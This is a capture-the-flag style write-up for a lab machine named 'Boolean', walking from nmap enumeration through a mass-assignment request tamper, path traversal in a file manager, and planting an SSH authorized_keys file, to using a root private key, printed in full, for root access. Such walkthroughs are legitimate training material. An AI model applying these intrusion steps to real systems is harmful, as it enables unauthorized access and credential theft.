##### Tags: `SUID`  `php`  `searchsploit`  `GTFOBin`

# 🐧Boolean🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.156.231
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 13:47 AEDT
Nmap scan report for 192.168.156.231
Host is up (0.22s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open   http
3000/tcp  closed ppp
33017/tcp open   http    Apache httpd 2.4.38 ((Debian))
```
There is a web login page  
We create a user and login as user  
Then click resend email  
Use burpsuite to change the payload
```
Add this to the payload  -   &user%5Bconfirmed%5D=True


_method=patch&authenticity_token=_QlOu-myYsI4qa-ASLIILonpLq6osynvu13Pmk0nln3kFf28ppete5SOJVGvvx3FffC3obtJeveir0LXeEkudQ&user%5Bconfirmed%5D=True&user%5Bemail%5D=test%40test.com&commit=Change%20email
```
Then we can successfully logged in to the file manager  
We can upload and download files  
the URL will change if we download a file
```
http://192.168.156.231/?cwd=&file=47631.txt&download=true
```
The cwd probably is the current working directory  
We try to change it and it shows all files in home directory
```
http://192.168.156.231/?cwd=../../../../../../../../home
remi
```
There is a remi user  
and we can access the .ssh directory  
Since the authorized_keys is missing and we can upload file, we will generate the key ourself and upload it
```
ssh-keygen -q -N '' -f sshkey
mv sshkey.pub authorized_keys
chmod 600 sshkey
```
upload the authorized_keys to the .ssh directory
the we can login as remi via ssh using the sshkey we created
```
$ ssh remi@192.168.156.231 -i sshkey
Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
remi@boolean:~/.ssh/keys$ id
uid=1000(remi) gid=1000(remi) groups=1000(remi)
```
## Privilege Escalation
Since remi can access the keys, there is a root key in the directory
```
remi@boolean:~/.ssh/keys$ ls
id_rsa  id_rsa.1  id_rsa.2  root
remi@boolean:~/.ssh/keys$ cat root
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAoTJ5p7WrrDkfTh1zHhLY1fn/OUuOvXSa7qchkPHyPkbe1e57mJRR
+K5YQZ2Vtp5yXSssXEXgpvmDh3etp1TYY1B+doQlsfy90o7DsbdTAKPMb+rFjSAD2vbb/9
RzX1DugtZZVPTOCcqjurRM9DIahBJRgEH7Sg6aOR3VJ+f27RDyhQ71pt4f5pFo/hcRBAlW
KGeXgXPlMMJklOn+y/ulxOrgQs+lCMy4B7Ey5bj8TZNZZFW8y+fd6h64uVJXnH1CGLGL4q
OdisyzyNj2s+ZF2qt8IAtfGw4lrwvMQXY8+Q20z5gCogL7zPjqr33pn8DjidOG3mTHKxvf
NttdTbiYZwAAA8hjhb/mY4W/5gAAAAdzc2gtcnNhAAABAQChMnmntausOR9OHXMeEtjV+f
85S469dJrupyGQ8fI+Rt7V7nuYlFH4rlhBnZW2nnJdKyxcReCm+YOHd62nVNhjUH52hCWx
/L3SjsOxt1MAo8xv6sWNIAPa9tv/1HNfUO6C1llU9M4JyqO6tEz0MhqEElGAQftKDpo5Hd
Un5/btEPKFDvWm3h/mkWj+FxEECVYoZ5eBc+UwwmSU6f7L+6XE6uBCz6UIzLgHsTLluPxN
k1lkVbzL593qHri5UlecfUIYsYvio52KzLPI2Paz5kXaq3wgC18bDiWvC8xBdjz5DbTPmA
KiAvvM+OqvfemfwOOJ04beZMcrG982211NuJhnAAAAAwEAAQAAAQAuLV14U6yoG30CTaFq
ng+LzJ/2c9SiJUM01p/g+85fVMIFGtpBLUwGJzuVIGWA+Qbd9b4xeLsQWi35oqkWZFHQsY
BoxxZdVH+0T71zrYaTiljIPsL02JUCJvGC6gNa7L5GsMzKb46Oc4RPudLJqYi7CNxcF4q6
/k/jyM4FLogoBNxeJ6dMa6Wt0ulHT8y9EwR14UXTC/Tu7nzuowUQGEipp1wFnS1O6di1uP
M43MigFbEbyXVJR0NYZptAKLKve9/ObMLiu4SjK+IL02zcRwWCmDLlzJBvGmPry4OdCfTo
m6iSo/a1f8VpxyOqttJCSQK9rtdO8lbFaxv/Tdid8XDBAAAAgA1PuafZwDLn7Bgx0a6KZa
4sbpU+J6BuX4kSriNbM4F1TV1nKXUREsPHMmKmeX2zCMUGxWSmJBzP9Ccv+5Zje4xdgqCs
M4ssosqcUmdA7SfDqxiVliertv1OIDwgV35lo5VsqDnUMCM6NmjJwhKSwmWr/vOmNjpSEZ
396y/M3jZ0AAAAgQDSk5FP4KG2Pa8+rH1akqSuLfe0LKqDZiEWqPL4QZp/UR8BNmbbnZLx
sxxbg5wwGsRE+2KQYKwmkyIE7BlwFPRb01izt5/BwHo2Ok6Ik9UHy9nf4WiN/mxLnOyqH9
N89ggVzh7Ue+8YAnUuD36uoJQCBfrx40lOtwZ4jtvCypyjlwAAAIEAw/gXHPpr1kNXuAUP
qY8KeYyr/753uwo1XVebc3ncmWBZ7y4Z0o28aV3pubbRiNpHy6fwn2L2YgLTvrMtryf+gU
eMXsLU2cNHbcU6UtuI9+SULIohrpAk5+wcy8gNytu3Mt6A7y+B1kw2J/7zWp3vJqO0g+Jn
ZiFQwJfGHaM8C7EAAAAMcmVtaUBib29sZWFuAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```
We will try to login local using the private to root 
```
remi@boolean:~/.ssh/keys$ ssh -o IdentitiesOnly=yes -i /home/remi/.ssh/keys/root root@127.0.0.1
Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

Last login: Mon Feb  2 01:04:46 2026 from 127.0.0.1
root@boolean:~# id
uid=0(root) gid=0(root) groups=0(root)
```
